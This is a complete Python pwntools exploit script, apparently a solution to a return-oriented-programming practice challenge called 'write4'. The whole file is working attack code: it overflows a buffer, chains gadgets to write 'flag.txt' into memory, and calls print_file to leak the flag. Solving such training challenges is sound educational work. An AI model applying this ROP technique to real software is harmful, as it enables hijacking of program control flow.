from pwn import *
elf = ELF("write4")

section_address = 0x000000000601038 #.bss section
movGadget = 0x400628 #mov [r14], r15; ret
setR14R15Gadget = 0x400690 #pop r14; pop r15; ret
setRDIGadget = 0x400693 #pop rdi; ret
retGadget = 0x4004e6 #ret;
winFunction = elf.plt["print_file"]
payload = b""
payload += b"a" * 40
write_string = b''.join(map(int.to_bytes, reversed(b"flag.txt")))
payload += p64(setR14R15Gadget)
payload += p64(section_address)
payload += p64(int.from_bytes(write_string))
payload += p64(movGadget)
payload += p64(setR14R15Gadget)
payload += p64(section_address + 8)
payload += p64(0)
payload += p64(movGadget)
payload += p64(setRDIGadget)
payload += p64(section_address)
#payload += p64(retGadget)
payload += p64(winFunction)
io = elf.process()
io.sendline(payload)
io.interactive()
